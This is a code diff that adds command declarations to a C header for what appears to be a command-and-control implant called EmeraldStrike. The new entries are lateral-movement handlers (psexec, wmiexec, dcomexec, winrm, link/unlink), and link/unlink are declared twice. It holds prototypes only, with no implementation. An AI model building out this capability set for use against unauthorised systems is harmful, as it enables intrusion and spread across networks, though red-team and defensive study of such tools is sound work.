@@ -47,6 +47,20 @@ VOID cmd_getprivs(PINSTANCE inst, PPARSER args, PPACKAGE response);
 VOID cmd_ppid(PINSTANCE inst, PPARSER args, PPACKAGE response);
 
 VOID cmd_blockdlls(PINSTANCE inst, PPARSER args, PPACKAGE response);
+
+VOID cmd_link(PINSTANCE inst, PPARSER args, PPACKAGE response);
+
+VOID cmd_unlink(PINSTANCE inst, PPARSER args, PPACKAGE response);
+
+VOID cmd_psexec(PINSTANCE inst, PPARSER args, PPACKAGE response);
+
+VOID cmd_psexec_psh(PINSTANCE inst, PPARSER args, PPACKAGE response);
+
+VOID cmd_wmiexec(PINSTANCE inst, PPARSER args, PPACKAGE response);
+
+VOID cmd_dcomexec(PINSTANCE inst, PPARSER args, PPACKAGE response);
+
+VOID cmd_winrm(PINSTANCE inst, PPARSER args, PPACKAGE response);
 VOID cmd_kill(PINSTANCE inst, PPARSER args, PPACKAGE response);
 VOID cmd_cp(PINSTANCE inst, PPARSER args, PPACKAGE response);
 VOID cmd_mv(PINSTANCE inst, PPARSER args, PPACKAGE response);
@@ -61,5 +75,7 @@ VOID cmd_spawn(PINSTANCE inst, PPARSER args, PPACKAGE response);
 VOID cmd_argue(PINSTANCE inst, PPARSER args, PPACKAGE response);
 VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response);
 VOID cmd_powerpick(PINSTANCE inst, PPARSER args, PPACKAGE response);
+VOID cmd_link(PINSTANCE inst, PPARSER args, PPACKAGE response);
+VOID cmd_unlink(PINSTANCE inst, PPARSER args, PPACKAGE response);
 
 #endif // EMERALDSTRIKE_COMMANDS_H
